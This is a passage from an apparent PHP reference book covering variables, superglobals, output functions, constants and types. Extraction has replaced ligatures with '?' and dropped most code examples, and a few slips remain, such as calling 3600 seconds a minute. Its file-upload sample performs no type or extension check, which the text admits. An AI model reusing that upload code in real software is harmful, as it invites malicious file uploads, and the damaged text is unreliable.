This invalidates the variable and it's value would be unde?ned or void if called. The variable is cleared from memory and deleted by the garbage collector.

Boolean

This is the simplest type with only two possible values.


Booleans can be used to control the ?ow of code.


Integer

An integer is a whole number positive or negative. It can be in used with any number base. The size of an integer is platform-dependent. PHP does not support unsigned integers.


Float

Floating point numbers, "doubles" or simply called "?oats" are decimal numbers.


Array

An array is like a list of values. The simplest form of an array is indexed by integer, and ordered by the index, with the ?rst element lying at index 0.




Arrays can also associate a key other than an integer index to a value. In PHP, all arrays are associative arrays behind the scenes, but when we refer to an 'associative array' distinctly, we usually mean one that contains one or more keys that aren't integers.


String

A string is like an array of characters.


Like an array, a string can be indexed to return its individual characters:


Object

An object is an instance of a class. Its variables and methods can be accessed with the -> operator.


Resource

Resource variables hold special handles to opened ?les, database connections, streams, image canvas areas and the like (as it is stated in the manual).



To get the type of a variable as a string, use the gettype() function:


Section 2.3: Global variable best practices
We can illustrate this problem with the following pseudo-code


Your ?rst question here is an obvious one

Where did $bob come from?


Are you confused? Good. You've just learned why globals are confusing and considered a bad practice.

If this were a real program, your next bit of fun is to go track down all instances of $bob and hope you ?nd the right one (this gets worse if $bob is used everywhere). Worse, if someone else goes and de?nes $bob (or you forgot and reused that variable) your code can break (in the above code example, having the wrong object, or no object at all, would cause a fatal error).

Since virtually all PHP programs make use of code like include('file.php'); your job maintaining code like this becomes exponentially harder the more ?les you add.

Also, this makes the task of testing your applications very di?cult. Suppose you use a global variable to hold your database connection:


In order to unit test this function, you have to override the global $dbConnector variable, run the tests and then reset it to its original value, which is very bug prone:


How do we avoid Globals?

The best way to avoid globals is a philosophy called Dependency Injection. This is where we pass the tools we need into the function or class.



This is much easier to understand and maintain. There's no guessing where $bob was set up because the caller is responsible for knowing that (it's passing us what we need to know). Better still, we can use type declarations to restrict what's being passed.
So we know that $bob is either an instance of the Bar class, or an instance of a child of Bar, meaning we know we can use the methods of that class. Combined with a standard autoloader (available since PHP 5.3), we can now go track down where Bar is de?ned. PHP 7.0 or later includes expanded type declarations, where you can also use scalar types (like int or string).
Version = 4.1

Superglobal variables

Super globals in PHP are prede?ned variables, which are always available, can be accessed from any scope throughout the script.
There is no need to do global $variable; to access them within functions/methods, classes or ?les. These PHP superglobal variables are listed below:
$GLOBALS
$_SERVER
$_REQUEST
$_POST
$_GET
$_FILES
$_ENV
$_COOKIE
$_SESSION

Section 2.4: Default values of uninitialized variables
Although not necessary in PHP however it is a very good practice to initialize variables. Uninitialized variables have a default value of their type depending on the context in which they are used:
Unset AND unreferenced


Boolean


String


Integer



Float/double


Array


Object


Relying on the default value of an uninitialized variable is problematic in the case of including one ?le into another which uses the same variable name.
Section 2.5: Variable Value Truthiness and Identical Operator
In PHP, variable values have an associated "truthiness" so even non-boolean values will equate to true or false. This allows any variable to be used in a conditional block, e.g.


Here are some fundamental rules for di?erent types of variable values:

Strings with non-zero length equate to true including strings containing only whitepace such as ' '. Empty strings '' equate to false.


Integers equate to true if they are nonzero, while zero equates to false.


null equates to false


Empty strings '' and string zero '0' equate to false.


Floating-point values equate to true if they are nonzero, while zero values equates to false.
NAN (PHP's Not-a-Number) equates to true, i.e. NAN == true is true. This is because NAN is a nonzero
?oating-point value.
Zero-values include both +0 and -0 as de?ned by IEEE 754. PHP does not distinguish between +0 and -0 in its double-precision ?oating-point, i.e. floatval('0') == floatval('-0') is true.
In fact, floatval('0') === floatval('-0').
Additionally, both floatval('0') == false and floatval('-0') == false.


IDENTICAL OPERATOR

In the PHP Documentation for Comparison Operators, there is an Identical Operator ===. This operator can be used to check whether a variable is identical to a reference value:


It has a corresponding not identical operator !==:


The identical operator can be used as an alternative to language functions like is_null().

USE CASE WITH strpos()

The strpos($haystack, $needle) language function is used to locate the index at which $needle occurs in
$haystack, or whether it occurs at all. The strpos() function is case sensitive; if case-insensitive ?nd is what you need you can go with stripos($haystack, $needle)
The strpos & stripos function also contains third parameter offset (int) which if speci?ed, search will start this number of characters counted from the beginning of the string. Unlike strrpos and strripos, the o?set cannot be

negative

The function can return:

0 if $needle is found at the beginning of $haystack;
a non-zero integer specifying the index if $needle is found somewhere other than the beginning in
$haystack;
and value false if $needle is not found anywhere in $haystack.

Because both 0 and false have truthiness false in PHP but represent distinct situations for strpos(), it is important to distinguish between them and use the identical operator === to look exactly for false and not just a value that equates to false.


Alternatively, using the not identical operator:


Chapter 3: Variable Scope
Variable scope refers to the regions of code where a variable may be accessed. This is also referred to as visibility. In PHP scope blocks are de?ned by functions, classes, and a global scope available throughout an application.
Section 3.1: Superglobal variables
Superglobal variables are de?ned by PHP and can always be used from anywhere without the global keyword.


Section 3.2: Static properties and variables
Static class properties that are de?ned with the public visibility are functionally the same as global variables. They can be accessed from anywhere the class is de?ned.


Functions can also de?ne static variables inside their own scope. These static variables persist through multiple function calls, unlike regular variables de?ned in a function scope. This can be a very easy and simple way to implement the Singleton design pattern:




Section 3.3: User-de?ned global variables
The scope outside of any function or class is the global scope. When a PHP script includes another (using include or require) the scope remains the same. If a script is included outside of any function or class, it's global variables are included in the same global scope, but if a script is included from within a function, the variables in the included script are in the scope of the function.

Within the scope of a function or class method, the global keyword may be used to create an access user-de?ned global variables.


A second way to access variables from the global scope is to use the special PHP-de?ned $GLOBALS array.

The $GLOBALS array is an associative array with the name of the global variable being the key and the contents of that variable being the value of the array element. Notice how $GLOBALS exists in any scope, this is because
$GLOBALS is a superglobal.

This means that the log_message() function could be rewritten as:




One might ask, why use the $GLOBALS array when the global keyword can also be used to get a global variable's value? The main reason is using the global keyword will bring the variable into scope. You then can't reuse the same variable name in the local scope.

Chapter 4: Superglobal Variables PHP
Superglobals are built-in variables that are always available in all scopes.

Several prede?ned variables in PHP are "superglobals", which means they are available in all scopes throughout a script. There is no need to do global $variable; to access them within functions or methods.
Section 4.1: Suberglobals explained
Introduction

Put simply, these are variables that are available in all scope in your scripts.

This means that there is no need to pass them as parameters in your functions, or store them outside a block of code to have them available in di?erent scopes.
What's a superglobal??

If you're thinking that these are like superheroes - they're not.

As of PHP version 7.1.3 there are 9 superglobal variables. They are as follows:

$GLOBALS - References all variables available in global scope
$_SERVER - Server and execution environment information
$_GET - HTTP GET variables
$_POST - HTTP POST variables
$_FILES - HTTP File Upload variables
$_COOKIE - HTTP Cookies
$_SESSION - Session variables
$_REQUEST - HTTP Request variables
      $_ENV - Environment variables See the documentation.
Tell me more, tell me more

I'm sorry for the Grease reference! Link

Time for some explanation on these superheroesglobals.

$GLOBALS


An associative array containing references to all variables which are currently de?ned in the global scope of the script. The variable names are the keys of the array.

Code




Output


In the above example $myLocal is not displayed the second time because it is declared inside the test() function and then destroyed after the function is closed.

Becoming global
To remedy this there are two options. Option one: global keyword


The global keyword is a pre?x on a variable that forces it to be part of the global scope.

Note that you cannot assign a value to a variable in the same statement as the global keyword. Hence, why I had to assign a value underneath. (It is possible if you remove new lines and spaces but I don't think it is neat. global
$myLocal; $myLocal = "local").

Option two: $GLOBALS array


In this example I reassigned $myLocal the value of $GLOBAL["myLocal"] since I ?nd it easier writing a variable name rather than the associative array.

$_SERVER


$_SERVER is an array containing information such as headers, paths, and script locations. The entries in this array are created by the web server. There is no guarantee that every web server will provide any of these; servers may omit some, or provide others not listed here. That said, a large number of these

variables are accounted for in the CGI/1.1 speci?cation, so you should be able to expect those.


An example output of this might be as follows (run on my Windows PC using WAMP)

C:\wamp64\www\test.php:2:
array (size=36)
'HTTP_HOST' => string 'localhost' (length=9) 'HTTP_CONNECTION' => string 'keep-alive' (length=10) 'HTTP_CACHE_CONTROL' => string 'max-age=0' (length=9) 'HTTP_UPGRADE_INSECURE_REQUESTS' => string '1' (length=1)
     'HTTP_USER_AGENT' => string 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36' (length=110)
     'HTTP_ACCEPT' => string 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' (length=74)
'HTTP_ACCEPT_ENCODING' => string 'gzip, deflate, sdch, br' (length=23) 'HTTP_ACCEPT_LANGUAGE' => string 'en-US,en;q=0.8,en-GB;q=0.6' (length=26) 'HTTP_COOKIE' => string 'PHPSESSID=0gslnvgsci371ete9hg7k9ivc6' (length=36)
     'PATH' => string 'C:\Program Files (x86)\NVIDIA Corporation\PhysX\Common;C:\Program Files (x86)\Intel\iCLS Client\;C:\Program Files\Intel\iCLS Client\;C:\ProgramData\Oracle\Java\javapath;C:\WINDOWS\system32;C:\WINDOWS;C:\WINDOWS\System32\Wbem
;C:\WINDOWS\System32\WindowsPowerShell\v1.0\;E:\Program Files\ATI Technologies\ATI.ACE\Core- Static;E:\Program Files\AMD\ATI.ACE\Core-Static;C:\Program Files (x86)\AMD\ATI.ACE\Core- Static;C:\Program Files (x86)\ATI Technologies\ATI.ACE\Core-Static;C:\Program Files\Intel\Intel(R) Managemen'... (length=1169)
'SystemRoot' => string 'C:\WINDOWS' (length=10)
'COMSPEC' => string 'C:\WINDOWS\system32\cmd.exe' (length=27)
'PATHEXT' => string '.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC;.PY' (length=57)
'WINDIR' => string 'C:\WINDOWS' (length=10)
     'SERVER_SIGNATURE' => string '<address>Apache/2.4.23 (Win64) PHP/7.0.10 Server at localhost Port 80</address>' (length=80)
'SERVER_SOFTWARE' => string 'Apache/2.4.23 (Win64) PHP/7.0.10' (length=32) 'SERVER_NAME' => string 'localhost' (length=9)
'SERVER_ADDR' => string '::1' (length=3) 'SERVER_PORT' => string '80' (length=2) 'REMOTE_ADDR' => string '::1' (length=3)
'DOCUMENT_ROOT' => string 'C:/wamp64/www' (length=13) 'REQUEST_SCHEME' => string 'http' (length=4) 'CONTEXT_PREFIX' => string '' (length=0)
'CONTEXT_DOCUMENT_ROOT' => string 'C:/wamp64/www' (length=13) 'SERVER_ADMIN' => string 'wampserver@wampserver.invalid' (length=29) 'SCRIPT_FILENAME' => string 'C:/wamp64/www/test.php' (length=26) 'REMOTE_PORT' => string '5359' (length=4)
'GATEWAY_INTERFACE' => string 'CGI/1.1' (length=7) 'SERVER_PROTOCOL' => string 'HTTP/1.1' (length=8) 'REQUEST_METHOD' => string 'GET' (length=3) 'QUERY_STRING' => string '' (length=0) 'REQUEST_URI' => string '/test.php' (length=13) 'SCRIPT_NAME' => string '/test.php' (length=13) 'PHP_SELF' => string '/test.php' (length=13) 'REQUEST_TIME_FLOAT' => float 1491068771.413 'REQUEST_TIME' => int 1491068771

There is a lot to take in there so I will pick out some important ones below. If you wish to read about them all then consult the indices section of the documentation.
I might add them all below one day. Or someone can edit and add a good explanation of them below? Hint, hint;) For all explanations below, assume the URL is http://www.example.com/index.php
HTTP_HOST - The host address.














$_GET

This would return www.example.com
HTTP_USER_AGENT - Contents of the user agent. This is a string which contains all the information about the client's browser, including operating system.
HTTP_COOKIE - All cookies in a concatenated string, with a semi-colon delimiter. SERVER_ADDR - The IP address of the server, of which the current script is running. This would return 93.184.216.34
PHP_SELF - The ?le name of the currently executed script, relative to document root. This would return /index.php
REQUEST_TIME_FLOAT - The timestamp of the start of the request, with microsecond precision. Available since PHP 5.4.0.
REQUEST_TIME - The timestamp of the start of the request. Available since PHP 5.1.0.



An associative array of variables passed to the current script via the URL parameters.


$_GET is an array that contains all the URL parameters; these are the whatever is after the ? in the URL.

Using http://www.example.com/index.php?myVar=myVal as an example. This information from this URL can be obtained by accessing in this format $_GET["myVar"] and the result of this will be myVal.
Using some code for those that don't like reading.


The above example makes use of the ternary operator.

This shows how you can access the value from the URL using the $_GET superglobal. Now another example! gasp




It is possible to send multiple variables through the URL by separating them with an ampersand (&) character.

Security risk
It is very important not to send any sensitive information via the URL as it will stay in history of the computer and will be visible to anyone that can access that browser.

$_POST


An associative array of variables passed to the current script via the HTTP POST method when using application/x-www-form-urlencoded or multipart/form-data as the HTTP Content-Type in the request.

Very similar to $_GET in that data is sent from one place to another.

I'll start by going straight into an example. (I have omitted the action attribute as this will send the information to the page that the form is in).



Above is a basic form for which data can be sent. In an real environment the value attribute would not be set meaning the form would be blank. This would then send whatever information is entered by the user.


Security risk
Sending data via POST is also not secure. Using HTTPS will ensure that data is kept more secure.

$_FILES


An associative array of items uploaded to the current script via the HTTP POST method. The structure of this array is outlined in the POST method uploads section.

Let's start with a basic form.


Note that I omitted the action attribute (again!). Also, I added enctype="multipart/form-data", this is important to any form that will be dealing with ?le uploads.


This is used to upload one ?le. Sometimes you may wish to upload more than one ?le. An attribute exists for that, it's called multiple.
There's an attribute for just about anything. I'm sorry

Below is an example of a form submitting multiple ?les.


Note the changes made here; there are only a few.

The input name has square brackets. This is because it is now an array of ?les and so we are telling the form

to make an array of the ?les selected. Omitting the square brackets will result in the latter most ?le being set to $_FILES["myVar"].
The multiple="multiple" attribute. This just tells the browser that users can select more than one ?le.

$total = isset($_FILES["myVar"]) ? count($_FILES["myVar"]["name"]) : 0; // count how many files were sent
// iterate over each of the files
for ($i = 0; $i < $total; $i++)
{
// there isn't an error
if ($_FILES["myVar"]["error"][$i] == UPLOAD_ERR_OK)
{
$folderLocation = "myFiles"; // a relative path. (could be "path/to/file" for example)

// if the folder doesn't exist then make it
if (!file_exists($folderLocation)) mkdir($folderLocation);

// move the file into the folder
          move_uploaded_file($_FILES["myVar"]["tmp_name"][$i], "$folderLocation/" . basename($_FILES["myVar"]["name"][$i]));
}
// else report the error
else switch ($_FILES["myVar"]["error"][$i])
{
case UPLOAD_ERR_INI_SIZE:
echo "Value: 1; The uploaded file exceeds the upload_max_filesize directive in
php.ini.";
break;
case UPLOAD_ERR_FORM_SIZE:
              echo "Value: 2; The uploaded file exceeds the MAX_FILE_SIZE directive that was specified in the HTML form.";
break;
case UPLOAD_ERR_PARTIAL:
echo "Value: 3; The uploaded file was only partially uploaded."; break;
case UPLOAD_ERR_NO_FILE:
echo "Value: 4; No file was uploaded."; break;
case UPLOAD_ERR_NO_TMP_DIR:
echo "Value: 6; Missing a temporary folder. Introduced in PHP 5.0.3."; break;
case UPLOAD_ERR_CANT_WRITE:
echo "Value: 7; Failed to write file to disk. Introduced in PHP 5.1.0."; break;
case UPLOAD_ERR_EXTENSION:
              echo "Value: 8; A PHP extension stopped the file upload. PHP does not provide a way to ascertain which extension caused the file upload to stop; examining the list of loaded extensions with phpinfo() may help. Introduced in PHP 5.2.0.";
break;

default:
echo "An unknown error has occurred."; break;
}
}

This is a very simple example and doesn't handle problems such as ?le extensions that aren't allowed or ?les named with PHP code (like a PHP equivalent of an SQL injection). See the documentation.
The ?rst process is checking if there are any ?les, and if so, set the total number of them to $total.

Using the for loop allows an iteration of the $_FILES array and accessing each item one at a time. If that ?le doesn't encounter a problem then the if statement is true and the code from the single ?le upload is run.
If an problem is encountered the switch block is executed and an error is presented in accordance with the error for that particular upload.

$_COOKIE


An associative array of variables passed to the current script via HTTP Cookies.


Cookies are variables that contain data and are stored on the client's computer.

Unlike the aforementioned superglobals, cookies must be created with a function (and not be assigning a value). The convention is below.


In this example a name is speci?ed for the cookie (in this example it is "myVar"), a value is given (in this example it is "myVal", but a variable can be passed to assign its value to the cookie), and then an expiration time is given (in this example it is one hour since 3600 seconds is a minute).
Despite the convention for creating a cookie being di?erent, it is accessed in the same way as the others.


To destroy a cookie, setcookie must be called again, but the expiration time is set to any time in the past. See below.


This will unset the cookies and remove it from the clients computer.

$_SESSION


An associative array containing session variables available to the current script. See the Session functions documentation for more information on how this is used.

Sessions are much like cookies except they are server side.

To use sessions you must include session_start() at the top of your scripts to allow sessions to be utilised. Setting a session variable is the same as setting any other variable. See example below.


When starting a session a random ID is set as a cookie and called "PHPSESSID" and will contain the session ID for that current session. This can be accessed by calling the session_id() function.
It is possible to destroy session variables using the unset function (such that unset($_SESSION["myVar"]) would destroy that variable).
The alternative is to call session_destory(). This will destroy the entire session meaning that all session variables will no longer exist.

$_REQUEST


An associative array that by default contains the contents of $_GET, $_POST and $_COOKIE.

As the PHP documentation states, this is just a collation of $_GET, $_POST, and $_COOKIE all in one variable. Since it is possible for all three of those arrays to have an index with the same name, there is a setting in the
php.ini ?le called request_order which can specify which of the three has precedence.
For instance, if it was set to "GPC", then the value of $_COOKIE will be used, as it is read from left to right meaning the $_REQUEST will set its value to $_GET, then $_POST, and then $_COOKIE and since $_COOKIE is last that is the value that is in $_REQUEST.
See this question.

$_ENV


An associative array of variables passed to the current script via the environment method.

These variables are imported into PHP's global namespace from the environment under which the PHP parser is running. Many are provided by the shell under which PHP is running and di?erent systems are likely running di?erent kinds of shells, a de?nitive list is impossible. Please see your shell's documentation for a list of de?ned environment variables.
Other environment variables include the CGI variables, placed there regardless of whether PHP is running as a server module or CGI processor.

Anything stored within $_ENV is from the environment from which PHP is running in.

$_ENV is only populated if php.ini allows it.
See this answer for more information on why $_ENV is not populated.
Section 4.2: PHP5 SuperGlobals
Below are the PHP5 SuperGlobals

$GLOBALS
$_REQUEST
$_GET
$_POST
$_FILES
$_SERVER
$_ENV
$_COOKIE
$_SESSION

$GLOBALS: This SuperGlobal Variable is used for accessing globals variables.




$_REQUEST: This SuperGlobal Variable is used to collect data submitted by a HTML Form.


$_GET: This SuperGlobal Variable is used to collect data submitted by HTML Form with get method.


$_POST: This SuperGlobal Variable is used to collect data submitted by HTML Form with post method.


$_FILES: This SuperGlobal Variable holds the information of uploaded ?les via HTTP Post method.




$_SERVER: This SuperGlobal Variable holds information about Scripts, HTTP Headers and Server Paths.

<?php
echo "<pre>"; print_r($_SERVER); echo "</pre>";
/**
Will print the following details on my local XAMPP
Array
(
[MIBDIRS] => C:/xampp/php/extras/mibs [MYSQL_HOME] => \xampp\mysql\bin
[OPENSSL_CONF] => C:/xampp/apache/bin/openssl.cnf [PHP_PEAR_SYSCONF_DIR] => \xampp\php
[PHPRC] => \xampp\php [TMP] => \xampp\tmp [HTTP_HOST] => localhost
[HTTP_CONNECTION] => keep-alive [HTTP_CACHE_CONTROL] => max-age=0 [HTTP_UPGRADE_INSECURE_REQUESTS] => 1
[HTTP_USER_AGENT] => Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko)
Chrome/52.0.2743.82 Safari/537.36
[HTTP_ACCEPT] => text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*;q=0.8 [HTTP_ACCEPT_ENCODING] => gzip, deflate, sdch
[HTTP_ACCEPT_LANGUAGE] => en-US,en;q=0.8
[PATH] => C:\xampp\php;C:\ProgramData\ComposerSetup\bin; [SystemRoot] => C:\Windows
[COMSPEC] => C:\Windows\system32\cmd.exe
[PATHEXT] => .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC
[WINDIR] => C:\Windows
[SERVER_SIGNATURE] => Apache/2.4.16 (Win32) OpenSSL/1.0.1p PHP/5.6.12 Server at localhost Port 80 [SERVER_SOFTWARE] => Apache/2.4.16 (Win32) OpenSSL/1.0.1p PHP/5.6.12
[SERVER_NAME] => localhost [SERVER_ADDR] => ::1
[SERVER_PORT] => 80
[REMOTE_ADDR] => ::1
[DOCUMENT_ROOT] => C:/xampp/htdocs [REQUEST_SCHEME] => http [CONTEXT_PREFIX] =>
[CONTEXT_DOCUMENT_ROOT] => C:/xampp/htdocs [SERVER_ADMIN] => postmaster@localhost [SCRIPT_FILENAME] => C:/xampp/htdocs/abcd.php [REMOTE_PORT] => 63822
[GATEWAY_INTERFACE] => CGI/1.1 [SERVER_PROTOCOL] => HTTP/1.1 [REQUEST_METHOD] => GET [QUERY_STRING] =>
[REQUEST_URI] => /abcd.php [SCRIPT_NAME]  =>  /abcd.php [PHP_SELF] => /abcd.php [REQUEST_TIME_FLOAT] => 1469374173.88
[REQUEST_TIME] => 1469374173
)
*/
?>

$_ENV: This SuperGlobal Variable Shell Environment Variable details under which the PHP is running.

$_COOKIE: This SuperGlobal Variable is used to retrieve Cookie value with given Key.


$_SESSION: This SuperGlobal Variable is used to Set and Retrieve Session Value which is stored on Server.


Chapter 5: Outputting the Value of a Variable
To build a dynamic and interactive PHP program, it is useful to output variables and their values. The PHP language allows for multiple methods of value output. This topic covers the standard methods of printing a value in PHP and where these methods can be used.
Section 5.1: echo and print
echo and print are language constructs, not functions. This means that they don't require parentheses around the argument like a function does (although one can always add parentheses around almost any PHP expression and thus echo("test") won't do any harm either). They output the string representation of a variable, constant, or expression. They can't be used to print arrays or objects.

Assign the string Joel to the variable $name


Output the value of $name using echo & print


Parentheses are not required, but can be used


Using multiple parameters (only echo)


print, unlike echo, is an expression (it returns 1), and thus can be used in more places:


The above is equivalent to:


Shorthand notation for echo

When outside of PHP tags, a shorthand notation for echo is available by default, using <?= to begin output and ?> to end it. For example:


Note that there is no terminating ;. This works because the closing PHP tag acts as the terminator for the single

statement. So, it is conventional to omit the semicolon in this shorthand notation.

Priority of print

Although the print is language construction it has priority like operator. It places between = += -= *= **= /= .= %= &= and and operators and has left association. Example:


Same example with brackets:

Di?erences between echo and print

In short, there are two main di?erences:

print only takes one parameter, while echo can have multiple parameters.
print returns a value, so can be used as an expression.

Section 5.2: Outputting a structured view of arrays and objects
print_r() - Outputting Arrays and Objects for debugging

print_r will output a human readable format of an array or object.

You may have a variable that is an array or object. Trying to output it with an echo will throw the error: Notice: Array to string conversion. You can instead use the print_r function to dump a human readable format of this variable.

You can pass true as the second parameter to return the content as a string.



This outputs the following:




Further, the output from print_r can be captured as a string, rather than simply echoed. For instance, the following code will dump the formatted version of $myarray into a new variable:


Note that if you are viewing the output of PHP in a browser, and it is interpreted as HTML, then the line breaks will not be shown and the output will be much less legible unless you do something like



Opening the source code of a page will also format your variable in the same way without the use of the
<pre> tag.


Alternatively you can tell the browser that what you're outputting is plain text, and not HTML:


var_dump() - Output human-readable debugging information about content of the argument(s) including its type and value

The output is more detailed as compared to print_r because it also outputs the type of the variable along with its
value and other information like object IDs, array sizes, string lengths, reference markers, etc.

You can use var_dump to output a more detailed version for debugging.


Output is more detailed:


Note: If you are using xDebug in your development environment, the output of var_dump is limited / truncated by default. See the o?cial documentation for more info about the options to change this.


var_export() - Output valid PHP Code

var_export() dumps a PHP parseable representation of the item.

You can pass true as the second parameter to return the contents into a variable.



Output is valid PHP code:


To put the content into a variable, you can do this:


After that, you can output it like this:


This will produce the following output:


Section 5.3: String concatenation with echo
You can use concatenation to join strings "end to end" while outputting them (with echo or print for example). You can concatenate variables using a . (period/dot).


Similar to concatenation, echo (when used without parentheses) can be used to combine strings and variables together (along with other arbitrary expressions) using a comma (,).




String concatenation vs passing multiple arguments to echo

Passing multiple arguments to the echo command is more advantageous than string concatenation in some circumstances. The arguments are written to the output in the same order as they are passed in.


The problem with the concatenation is that the period . takes precedence in the expression. If concatenated, the above expression needs extra parentheses for the correct behavior. The precedence of the period a?ects ternary operators too.


Section 5.4: printf vs sprintf
printf will output a formatted string using placeholders

sprintf will return the formatted string


It is also possible to format a number with these 2 functions. This can be used to format a decimal value used to represent money so that it always has 2 decimal digits.


The two functions vprintf and vsprintf operate as printf and sprintf, but accept a format string and an array of values, instead of individual variables.
Section 5.5: Outputting large integers
On 32-bits systems, integers larger than PHP_INT_MAX are automatically converted to ?oat. Outputting these as integer values (i.e. non-scienti?c notation) can be done with printf, using the float representation, as illustrated below:



}

// outputs:

pow(1024,
1) integer
1024
1024
1024
pow(1024,
2) integer
1048576
1048576
1048576
pow(1024,
3) integer
1073741824
1073741824
1073741824
pow(1024,
4)	double
1099511627776
1099511627776
1099511627776
pow(1024,
5)	double
1.1258999068426E+15
1125899906842624











Note: watch out for ?oat precision, which is not in?nite!


While this looks nice, in this contrived example the numbers can all be represented as a binary number since they are all powers of 1024 (and thus 2). See for example:


Section 5.6: Output a Multidimensional Array with index and value and print into the table




Output Multidimensional Array with index and value in table


Chapter 6: Constants
Section 6.1: De?ning constants
Constants are created using the const statement or the define function. The convention is to use UPPERCASE letters for constant names.

De?ne constant using explicit values
De?ne constant using another constant

if you have one constant you can de?ne another one based on it:

Reserved constants

Some constant names are reserved by PHP and cannot be rede?ned. All these examples will fail:


And a Notice will be issued:

Conditional de?nes

If you have several ?les where you may de?ne the same variable (for example, your main con?g then your local con?g) then following syntax may help avoiding con?icts:

const vs define

define is a runtime expression while const a compile time one.

Thus define allows for dynamic values (i.e. function calls, variables etc.) and even dynamic names and conditional de?nition. It however is always de?ning relative to the root namespace.

const is static (as in allows only operations with other constants, scalars or arrays, and only a restricted set of them, the so called constant scalar expressions, i.e. arithmetic, logical and comparison operators as well as array dereferencing), but are automatically namespace pre?xed with the currently active namespace.

const only supports other constants and scalars as values, and no operations.
Section 6.2: Class Constants
Constants can be de?ned inside classes using a const keyword.


This is useful to store types of items.


Section 6.3: Checking if constant is de?ned
Simple check

To check if constant is de?ned use the defined function. Note that this function doesn't care about constant's value, it only cares if the constant exists or not. Even if the value of the constant is null or false the function will still return true.




Note that constant becomes "visible" in your code only after the line where you have de?ned it:

Getting all de?ned constants

To get all de?ned constants including those created by PHP use the get_defined_constants function:


To get only those constants that were de?ned by your app call the function at the beginning and at the end of your script (normally after the bootstrap process):


It's sometimes useful for debugging

Section 6.4: Using constants
To use the constant simply use its name:


or if you don't know the name of the constant in advance, use the constant function:


Section 6.5: Constant arrays
Arrays can be used as plain constants and class constants from version PHP 5.6 onwards:

Class constant example

Plain constant example

Also from version PHP 7.0 this functionality was ported to the define function for plain constants.


Chapter 7: Magic Constants


Section 7.1: Di?erence between
	METHOD	

	FUNCTION	and


__FUNCTION__ returns only the name of the function whereas __METHOD__ returns the name of the class along with the name of the function:



Section 7.2: Di?erence between get_called_class()

	CLASS	, get_class() and


__CLASS__ magic constant returns the same result as get_class() function called without parameters and they both return the name of the class where it was de?ned (i.e. where you wrote the function call/constant name ).

In contrast, get_class($this) and get_called_class() functions call, will both return the name of the actual class which was instantiated:




Section 7.3: File & Directory Constants
Current ?le

You can get the name of the current PHP ?le (with the absolute path) using the __FILE__ magic constant. This is most often used as a logging/debugging technique.

Current directory

To get the absolute path to the directory where the current ?le is located use the  DIR	magic constant.


To get the absolute path to the directory where the current ?le is located, use dirname(__FILE__).


Getting current directory is often used by PHP frameworks to set a base directory:


Separators

Windows system perfectly understands the / in paths so the DIRECTORY_SEPARATOR is used mainly when parsing paths.

Besides magic constants PHP also adds some ?xed constants for working with paths:

DIRECTORY_SEPARATOR constant for separating directories in a path. Takes value / on *nix, and \ on Windows. The example with views can be rewritten with:


Rarely used PATH_SEPARATOR constant for separating paths in the $PATH environment variable. It is ; on Windows, : otherwise

Chapter 8: Comments
Section 8.1: Single Line Comments
The single line comment begins with "//" or "#". When encountered, all text to the right will be ignored by the PHP interpreter.


Section 8.2: Multi Line Comments
The multi-line comment can be used to comment out large blocks of code. It begins with /* and ends with */.


Chapter 9: Types
Section 9.1: Type Comparison
There are two types of comparison: loose comparison with == and strict comparison with ===. Strict comparison ensures both the type and value of both sides of the operator are the same.


You can also use strong comparison to check if type and value don't match using !==.

A typical example where the == operator is not enough, are functions that can return di?erent types, like strpos, which returns false if the searchword is not found, and the match position (int) otherwise:


Section 9.2: Boolean
Boolean is a type, having two values, denoted as true or false. This code sets the value of $foo as true and $bar as false:


true and false are not case sensitive, so TRUE and FALSE can be used as well, even FaLsE is possible. Using lower case is most common and recommended in most code style guides, e.g. PSR-2.

Booleans can be used in if statements like this:


Due to the fact that PHP is weakly typed, if $foo above is other than true or false, it's automatically coerced to a boolean value.

The following values result in false:

a zero value: 0 (integer), 0.0 (?oat), or '0' (string) an empty string '' or array []
      null (the content of an unset variable, or assigned to a variable) Any other value results in true.
To avoid this loose comparison, you can enforce strong comparison using ===, which compares value and type. See Type Comparison for details.

To convert a type into boolean, you can use the (bool) or (boolean) cast before the type.


or call the boolval function:


Boolean conversion to a string (note that false yields an empty string):


Boolean conversion to an integer:


Note that the opposite is also possible:


Also all non-zero will return true:


Section 9.3: Float


For historical reasons "double" is returned by gettype() in case of a ?oat, and not simply "?oat"


Floats are ?oating point numbers, which allow more output precision than plain integers. Floats and integers can be used together due to PHP's loose casting of variable types:



php does not show ?oat as ?oat number like other languages, for example:

Warning

Floating point precision

(From the PHP manual page)

Floating point numbers have limited precision. Although it depends on the system, PHP typically give a maximum relative error due to rounding in the order of 1.11e-16. Non elementary arithmetic operations may give larger errors, and error propagation must be considered when several operations are compounded.


Additionally, rational numbers that are exactly representable as ?oating point numbers in base 10, like
0.1 or 0.7, do not have an exact representation as ?oating point numbers in base 2 (binary), which is used internally, no matter the size of the mantissa. Hence, they cannot be converted into their internal binary counterparts without a small loss of precision. This can lead to confusing results: for example, ?oor((0.1+0.7)*10) will usually return 7 instead of the expected 8, since the internal representation will be something like 7.9999999999999991118....


So never trust ?oating number results to the last digit, and do not compare ?oating point numbers directly for equality. If higher precision is necessary, the arbitrary precision math functions and gmp functions are available.

Section 9.4: Strings
A string in PHP is a series of single-byte characters (i.e. there is no native Unicode support) that can be speci?ed in four ways:
Single Quoted

Displays things almost completely "as is". Variables and most escape sequences will not be interpreted. The exception is that to display a literal single quote, one can escape it with a back slash ', and to display a back slash, one can escape it with another backslash \


Double Quoted

Unlike a single-quoted string, simple variable names and escape sequences in the strings will be evaluated. Curly braces (as in the last example) can be used to isolate complex variable names.


Heredoc

In a heredoc string, variable names and escape sequences are parsed in a similar manner to double-quoted strings, though braces are not available for complex variable names. The start of the string is delimited by <<<identifier, and the end by identifier, where identifier is any valid PHP name. The ending identi?er must appear on a line by itself. No whitespace is allowed before or after the identi?er, although like any line in PHP, it must also be terminated by a semicolon.


Nowdoc

A nowdoc string is like the single-quoted version of heredoc, although not even the most basic escape sequences are evaluated. The identi?er at the beginning of the string is wrapped in single quotes.
PHP 5.x Version = 5.3



Section 9.5: Callable
